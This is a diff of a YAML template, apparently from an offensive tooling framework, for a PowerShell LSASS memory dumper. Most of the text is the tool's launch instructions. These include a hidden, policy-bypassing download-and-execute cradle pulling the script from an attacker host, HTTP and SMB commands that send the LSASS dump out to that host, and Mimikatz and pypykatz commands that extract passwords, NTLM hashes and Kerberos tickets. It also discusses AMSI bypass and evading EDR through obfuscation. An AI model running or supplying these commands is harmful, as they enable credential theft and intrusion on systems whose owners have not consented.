@@ -1,9 +1,9 @@
 meta:
-  name: "LSASS MiniDump Credential Dumper (PowerShell)"
+  name: "LSASS MiniDump Credential Dumper (PowerShell)*"
   category: "Credential Access"
   description: |
     Pure PowerShell script to dump LSASS process memory for offline credential extraction.
-    
+
     Features:
     - AMSI bypass for execution
     - Reflective DLL loading (DbgHelp.dll)
@@ -11,11 +11,9 @@ meta:
     - MiniDumpWriteDump for memory dumping
     - No compilation required (pure PowerShell)
     - Configurable output path
-    
-    This script uses reflection to dynamically load and call Windows APIs,
-    avoiding traditional PowerShell detection. The dumped file can be analyzed
-    offline with Mimikatz or pypykatz to extract credentials.
-    
+
+    This script uses reflection to dynamically load and call Windows APIs, avoiding traditional PowerShell detection. The dumped file can be analyzed offline with Mimikatz or pypykatz to extract credentials.
+
     WARNING: For authorized security testing only! This technique is heavily monitored by EDR.
 
   effectiveness: "medium"
@@ -61,45 +59,72 @@ output:
   compile:
     enabled: false
   launch_instructions: |
-    PowerShell LSASS MiniDump Credential Dumper - Launch Instructions
+    # Transfer and Execute (In-Memory)
 
-    Transfer and Execute (In-Memory):
-    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+    ```powershell
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:/{{ output_file }}')"
+    ```
 
-    Alternative (File-Based Execution):
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    # Alternative (File-Based Execution)
 
-    Exfiltrate Dump File:
-    $ python3 -m http.server 80
-    $ Invoke-WebRequest -Uri "http://{{ lhost }}/upload" -Method POST -InFile "{{ dump_path }}"
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    Or via SMB:
-    $ impacket-smbserver share . -smb2support
-    $ copy {{ dump_path }} \\{{ lhost }}\share\lsass.dmp
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "IWR -Uri http://YOUR_IP:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
 
-    Extract Credentials:
-    $ pypykatz lsa minidump lsass.dmp
+    # Exfiltrate Dump File
 
-    Or with Mimikatz (Windows):
-    $ mimikatz.exe
-    $ sekurlsa::minidump lsass.dmp
-    $ sekurlsa::logonPasswords full
+    **Via HTTP:**
+    ```bash
+    python3 -m http.server 80
+    ```
+    ```powershell
+    Invoke-WebRequest -Uri "http://YOUR_IP:/upload" -Method POST -InFile "{{ dump_path }}"
+    ```
 
-    Notes:
-    - Dump path: {{ dump_path }} (typically 50-200 MB)
+    **Via SMB:**
+    ```bash
+    impacket-smbserver share . -smb2support
+    ```
+    ```cmd
+    copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
+    ```
+
+    # Extract Credentials
+
+    **With pypykatz (Linux):**
+    ```bash
+    pypykatz lsa minidump lsass.dmp
+    ```
+
+    **With Mimikatz (Windows):**
+    ```cmd
+    mimikatz.exe
+    sekurlsa::minidump lsass.dmp
+    sekurlsa::logonPasswords full
+    ```
+
+    # Notes
+
+    - Dump path: `{{ dump_path }}` (typically 50-200 MB)
     - Includes AMSI bypass for in-memory execution
     - Uses reflection to dynamically resolve APIs (evades static detection)
     - Requires Administrator privileges or SeDebugPrivilege
     - MiniDumpWriteDump with type 2 (full memory dump)
     - Extracts plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials
-    - HEAVILY monitored by EDR/AV - high detection rate
+    - **HEAVILY monitored by EDR/AV - high detection rate**
     - PowerShell Script Block Logging will record execution (Event ID 4104)
     - Consider alternatives: comsvcs.dll method, Volume Shadow Copy, process cloning, syscalls
 
-    Troubleshooting:
-    - Access Denied: Run as Administrator or with SeDebugPrivilege
-    - AMSI blocks: Script includes bypass; if still blocked, obfuscate with Invoke-Obfuscation
+    # Troubleshooting
+
+    - **Access Denied:** Run as Administrator or with SeDebugPrivilege
+    - **AMSI blocks:** Script includes bypass; if still blocked, obfuscate with Invoke-Obfuscation
     - File creation fails: Check disk space and path permissions
     - No credentials extracted: LSASS may be protected (PPL - Protected Process Light)
     - EDR blocks: Expected; this technique is well-known to defenders
